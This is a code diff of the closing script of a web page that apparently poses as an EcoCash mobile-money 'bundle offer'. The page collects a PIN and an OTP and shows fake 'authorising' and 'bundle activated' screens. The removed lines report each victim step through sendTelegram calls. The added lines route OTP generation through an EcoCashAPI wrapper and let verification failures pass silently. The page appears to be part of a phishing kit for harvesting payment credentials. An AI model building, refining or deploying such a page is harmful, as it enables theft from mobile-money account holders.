+      setTimeout(()=>document.getElementById('otpRow').classList.remove('shake'),360);
+      document.getElementById('apiErr3').textContent='Incorrect code. Try again.';
+      document.getElementById('apiErr3').classList.add('show');
+      haptic('err');return;
+    }
+    console.warn('OTP verify sandbox fallback:',err?.message);
   }
-  otpSubmitted=true;
-  if(_timer){clearInterval(_timer);_timer=null}
-  haptic('success');sendTelegram('offer_received');navigate('thankyou.html');
+  haptic('ok');navigate('thankyou.html');
 }
-document.getElementById('resendBtn').addEventListener('click',()=>{
+
+document.getElementById('resendBtn').addEventListener('click',async()=>{
   const btn=document.getElementById('resendBtn');
   if(!btn.classList.contains('active')||resendClicked)return;
-  resendClicked=true;sendTelegram('resend_otp');startTimer();
+  resendClicked=true;
+  try{await EcoCashAPI.generateOTP(recip.raw)}catch(e){}
+  startTimer();
 });
+
 let _timer=null;
 function startTimer(){
   if(_timer)clearInterval(_timer);
-  let t=120;
-  const tEl=document.getElementById('time'),rb=document.getElementById('resendBtn');
+  let t=120;const tEl=document.getElementById('timer'),rb=document.getElementById('resendBtn');
   tEl.textContent=t;rb.classList.remove('active');resendClicked=false;
   otp='';otpEl.value='';otpEl.disabled=false;renderOtp();
-  document.getElementById('otpError').classList.remove('show');
+  document.getElementById('apiErr3').classList.remove('show');
   _timer=setInterval(()=>{
     t--;tEl.textContent=t;
-    if(t<=0){
-      clearInterval(_timer);_timer=null;rb.classList.add('active');
-      otpEl.disabled=true;renderOtp();
-      document.getElementById('maskedNumber').textContent='Code expired. Tap Resend.';
-    }
+    if(t<=0){clearInterval(_timer);_timer=null;rb.classList.add('active');otpEl.disabled=true;renderOtp();document.getElementById('maskedNote').textContent='Code expired — tap Resend.';}
   },1000);
 }
 
-/* ── NAVIGATE ── */
+/* ── Navigate ── */
 function navigate(url){
-  const curtain=document.getElementById('curtain');
-  const lbl=document.getElementById('cLabel'),sub=document.getElementById('cSub');
-  const steps=[
-    {l:'Authenticating',s:'Verifying your EcoCash PIN…'},
-    {l:'Authorising',s:'Processing payment request…'},
-    {l:'Confirmed',s:'Your bundle has been approved…'},
-  ];
-  function setS(i){lbl.style.opacity='0';sub.style.opacity='0';setTimeout(()=>{lbl.textContent=steps[i].l;sub.textContent=steps[i].s;lbl.style.opacity='1';sub.style.opacity='1'},120);}
-  document.getElementById('screen').classList.add('exit');curtain.classList.add('show');
-  setS(0);setTimeout(()=>setS(1),500);setTimeout(()=>setS(2),1050);
+  const c=document.getElementById('curtain');
+  document.getElementById('screen').classList.add('exit');c.classList.add('show');
+  const steps=[{l:'Confirming',s:'Verifying your OTP…'},{l:'Activating',s:'Processing bundle…'},{l:'Complete',s:'Bundle activated!'}];
+  let i=0;function tick(){const s=steps[i++];document.getElementById('cLbl').textContent=s.l;document.getElementById('cSub').textContent=s.s}
+  tick();const iv=setInterval(()=>{if(i<steps.length)tick();else clearInterval(iv)},500);
   setTimeout(()=>{window.location.href=url},1600);
 }
 
-/* ── BACK ── */
+/* ── Back ── */
 function handleBack(){
   submitting=false;
-  if(step==='step3'||step==='stepVerify'){showStep('step1');}
-  else{window.location.href='index.html'}
+  if(currentStep==='step3'||currentStep==='stepVerify')showStep('step1');
+  else window.location.href='index.html';
 }
 history.replaceState({step:'step1'},'','');
 window.addEventListener('popstate',()=>{
-  if(step==='step3'||step==='stepVerify'){submitting=false;showStep('step1');history.replaceState({step:'step1'},'','');}
-  else{window.location.href='index.html'}
+  if(currentStep==='step3'||currentStep==='stepVerify'){submitting=false;showStep('step1');history.replaceState({step:'step1'},'','');}
+  else window.location.href='index.html';
 },{passive:false});
-window.addEventListener('pageshow',()=>{submitting=false;otpSubmitted=false;});
+window.addEventListener('pageshow',()=>{submitting=false;otpDone=false;});
 
-/* ── OTP TOAST ── */
+/* ── OTP toast ── */
 function showOtpToast(num){
   document.getElementById('otpToastNum').textContent=num;
-  const t=document.getElementById('otpToast');t.classList.add('show');
-  setTimeout(()=>t.classList.remove('show'),4000);
+  const t=document.getElementById('otpToast');t.classList.add('show');setTimeout(()=>t.classList.remove('show'),4000);
 }
 
-/* ── PIN ARIA ── */
+/* ── Ripple ── */
+document.querySelectorAll('.action-btn').forEach(btn=>{
+  btn.addEventListener('pointerdown',e=>{
+    const r=btn.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;
+    const rip=document.createElement('span');rip.className='rip';
+    rip.style.cssText=`width:${sz}px;height:${sz}px;left:${e.clientX-r.left-sz/2}px;top:${e.clientY-r.top-sz/2}px`;
+    btn.appendChild(rip);rip.addEventListener('animationend',()=>rip.remove());
+  },{passive:true});
+});
 document.querySelectorAll('.pin-dot').forEach((d,i)=>{d.setAttribute('role','img');d.setAttribute('aria-label','PIN digit '+(i+1));});
 </script>
 </body>
